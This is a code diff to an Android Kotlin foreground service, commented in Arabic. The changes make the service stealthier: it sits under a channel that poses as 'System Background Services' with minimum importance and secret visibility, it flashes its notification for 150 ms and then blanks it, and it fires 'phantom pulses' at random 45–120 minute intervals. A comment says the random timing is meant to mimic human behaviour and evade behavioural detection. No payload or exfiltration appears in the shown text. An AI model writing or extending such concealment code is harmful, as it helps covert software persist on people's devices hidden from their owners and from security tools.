@@ -22,13 +22,12 @@ class ForegroundService : Service() {
         private const val TAG = "ForegroundService"
         const val NOTIFICATION_ID = 9991
         private const val CHANNEL_ID = "shield_ghost_channel_v4"
-        private const val PULSE_DURATION_MS = 200L
+        private const val PULSE_DURATION_MS = 150L // أجزاء من الثانية (ظهور خاطف)
     }
 
     private val handler = Handler(Looper.getMainLooper())
     private var isForeground = false
     private var hideRunnable: Runnable? = null
-    
     private val scheduler = Executors.newSingleThreadScheduledExecutor()
 
     override fun onBind(intent: Intent?): IBinder? = null
@@ -49,10 +48,12 @@ class ForegroundService : Service() {
         createGhostChannel()
         startForeground(NOTIFICATION_ID, buildGhostNotification("System Ready"))
         isForeground = true
-        
+
+        // جدولة نبضات شبحية بفترات متباعدة وعشوائية (45-120 دقيقة)
+        // لمحاكاة سلوك بشري وتجنب الكشف السلوكي
         scheduler.scheduleAtFixedRate({
             triggerPhantomPulse("Background Sync")
-        }, Random.nextLong(4, 9), Random.nextLong(4, 9), TimeUnit.HOURS)
+        }, Random.nextLong(45, 120), Random.nextLong(45, 120), TimeUnit.MINUTES)
 
         return START_STICKY
     }
@@ -63,7 +64,7 @@ class ForegroundService : Service() {
                 val channel = NotificationChannel(
                     CHANNEL_ID,
                     "System Background Services",
-                    NotificationManager.IMPORTANCE_MIN
+                    NotificationManager.IMPORTANCE_MIN // أقل أهمية ممكنة
                 ).apply {
                     description = "Core system operations"
                     setSound(null, null)
@@ -93,7 +94,7 @@ class ForegroundService : Service() {
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setCategory(NotificationCompat.CATEGORY_SERVICE)
             .setSilent(true)
-            .setOngoing(true)
+            .setOngoing(true)   // مستمر لإبقاء الخدمة حية
             .setShowWhen(false)
             .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .setContentIntent(openPending)
@@ -102,12 +103,17 @@ class ForegroundService : Service() {
 
     private fun triggerPhantomPulse(actionType: String) {
         if (!isForeground) return
+        // إلغاء أي إخفاء مجدول سابق
         hideRunnable?.let { handler.removeCallbacks(it) }
+
         val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+        // إظهار الإشعار لفترة خاطفة
         nm.notify(NOTIFICATION_ID, buildGhostNotification("Processing $actionType..."))
-        
+
+        // جدولة إخفاء الإشعار بعد أجزاء من الثانية
         hideRunnable = Runnable {
             if (isForeground) {
+                // تحديث الإشعار بنص فارغ (يختفي من الواجهة لكن الخدمة تبقى)
                 nm.notify(NOTIFICATION_ID, buildGhostNotification(""))
             }
         }
